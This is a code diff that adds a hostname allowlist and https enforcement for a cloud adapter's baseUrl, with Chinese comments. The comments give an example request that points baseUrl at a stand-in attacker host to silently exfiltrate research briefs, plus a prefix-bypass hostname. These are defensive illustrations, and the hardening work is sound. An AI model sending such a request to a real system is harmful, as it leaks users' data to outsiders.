@@ -31,6 +31,92 @@ class CloudAdapterError(Exception):
     """调用失败时统一抛这个，上层不用关心具体是哪条通道的哪种异常。"""
 
 
+# ── S6-B baseUrl 白名单 ────────────────────────────────────
+#
+# 🔴 **这个字段原来一个字符都没校验。** `/cloud/synthesize` 会把整份研究简报
+#    （你的查询词、抓回来的正文摘录、来源清单）POST 到 `baseUrl`。所以一次
+#    `POST /api/cloud/configure {"baseUrl":"https://攻击者.example/v1", ...}`
+#    之后，每一份简报都照常生成、界面上没有任何异常，**只是同时也发给了别人**。
+#    本机接口是零鉴权的，而这个 POST 恰好是"改一个字段就静默改变数据去向"。
+#
+# 白名单按**主机名**判，不是按前缀 —— 前缀判据挡不住
+# `https://api.openai.com.攻击者.example/v1` 这种写法。
+# 允许子域（`gateway.ai.cloudflare.com` 这类），但必须是白名单域的真子域。
+
+#: 允许直接填的厂商域名。这批是"填进去就能用"的默认档。
+_VENDOR_HOSTS: tuple[str, ...] = (
+    "api.openai.com",
+    "api.anthropic.com",
+    "api.deepseek.com",
+    "api.moonshot.cn",
+    "open.bigmodel.cn",           # 智谱
+    "dashscope.aliyuncs.com",     # 通义千问
+    "ark.cn-beijing.volces.com",  # 火山方舟
+    "api.minimax.chat",
+    "api.baichuan-ai.com",
+    "api.mistral.ai",
+    "api.groq.com",
+    "openrouter.ai",
+    "api.together.xyz",
+    "generativelanguage.googleapis.com",
+    "api.siliconflow.cn",
+    "api.x.ai",
+    "api.perplexity.ai",
+)
+
+
+def _host_allowed(host: str) -> bool:
+    host = host.lower().rstrip(".")
+    return any(host == h or host.endswith("." + h) for h in _VENDOR_HOSTS)
+
+
+def validate_base_url(base_url: str, *, allow_custom: bool) -> tuple[bool, str]:
+    """
+    这个 `baseUrl` 能不能用来发简报。返回 `(能不能, 不能的话原因是什么)`。
+
+    空串 = 用各条通道自己的官方默认地址，永远允许。
+
+    三条硬规则：
+      1. 必须 https。http 意味着简报正文在网络上是明文的 ——
+         这个功能发出去的恰恰是用户资料的摘录，明文传输不能接受。
+      2. 主机名必须在厂商白名单里（或它的子域）。
+      3. 想填自建 / 中转地址，要显式打开 `--allow-custom-cloud-endpoint`
+         （或环境变量 `SYNORIVE_ALLOW_CUSTOM_CLOUD_ENDPOINT=1`），**默认关**。
+         开着之后仍然强制 https —— 那一条没有"自建所以算了"的例外。
+
+    ⚠️ 白名单挡的是"字段被悄悄改掉"，**挡不住"用户自己被骗着去开自建开关"**。
+       后者只能靠开关本身要用户明确操作一次。
+    """
+    s = (base_url or "").strip()
+    if not s:
+        return True, ""
+
+    from urllib.parse import urlparse
+
+    try:
+        u = urlparse(s)
+    except ValueError:
+        return False, "这个地址格式不对"
+    if u.scheme != "https":
+        return False, (
+            f"云端地址必须是 https（收到 {u.scheme or '空'}）—— "
+            "这条通道发出去的是你的资料摘录，明文传输不行"
+        )
+    host = (u.hostname or "").strip("[]")
+    if not host:
+        return False, "这个地址里没有主机名"
+    if _host_allowed(host):
+        return True, ""
+    if allow_custom:
+        return True, ""
+    return False, (
+        f"{host} 不在已知的云端厂商名单里。要填自建或中转地址，"
+        "得先打开「允许自建云端端点」（引擎启动参数 --allow-custom-cloud-endpoint，"
+        "或环境变量 SYNORIVE_ALLOW_CUSTOM_CLOUD_ENDPOINT=1），默认是关的 —— "
+        "因为这个地址决定了你的研究简报会被发到哪里去"
+    )
+
+
 @dataclass
 class ChatResult:
     text: str
